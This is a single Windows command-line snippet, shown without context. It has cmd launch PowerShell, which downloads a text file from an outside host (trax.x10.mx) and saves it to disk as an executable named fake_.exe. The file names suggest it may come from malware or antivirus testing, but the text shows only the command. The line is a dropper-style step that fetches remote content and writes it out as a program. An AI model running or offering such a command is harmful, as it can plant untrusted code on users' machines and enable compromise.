
cmd /c powershell -Command (new-object System.Net.WebClient).Downloadfile('http://trax.x10.mx/count_vt.txt', 'C:\_AB\fake_.exe') ; 'Done.'

